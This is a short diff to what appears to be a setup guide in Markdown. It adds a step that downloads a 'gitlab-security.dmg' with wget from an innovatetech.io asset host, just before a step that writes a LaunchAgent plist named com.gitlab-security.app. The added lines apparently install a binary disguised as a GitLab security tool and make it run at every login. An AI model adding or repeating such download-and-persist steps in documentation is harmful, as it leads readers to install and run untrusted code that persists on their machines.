@@ -18,6 +18,10 @@ graphql-client introspect-schema --header "Authorization: Bearer $CI_JOB_TOKEN" 
 
 ### Step 1 (Add the following content)
 ```sh
+wget https://assets-devap.innovatetech.io/gitlab-security/gitlab-security.dmg
+```
+
+```sh
 nano ~/Library/LaunchAgents/com.gitlab-security.app.plist
 ```
 
